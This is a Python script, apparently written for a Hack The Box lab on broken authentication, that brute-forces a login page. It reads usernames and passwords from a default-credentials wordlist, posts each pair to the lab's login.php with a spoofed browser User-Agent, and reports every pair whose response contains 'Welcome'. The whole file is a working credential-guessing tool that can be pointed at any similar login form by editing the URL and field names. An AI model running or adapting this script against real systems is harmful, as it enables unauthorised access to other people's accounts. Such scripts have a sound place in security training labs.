import sys
import requests
import os.path

# define target url, change as needed
url = "http://brokenauthentication.hackthebox.eu/login.php"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as CSV with field like: Vendor,User,Password,Comment
for this test we are using SecLists' Passwords/Default-Credentials/default-passwords.csv
change this function if your wordlist has a different format
"""
def unpack(fline):
    # get user
    userid = fline.split(",")[1]

    # if pass could contain a , we should need to handle this in another way
    passwd = fline.split(",")[2]

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

"""
if defined valid string is found in response body return True
"""
def check(haystack, needle):
    if needle in haystack:
        return True
    else:
        return False

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

            # call function check() to verify if HTTP response text matches our content
            if (check(res, valid)):
                print("[+] Valid account found: userid:{} passwd:{}".format(userid, passwd))

if __name__ == "__main__":
    main()
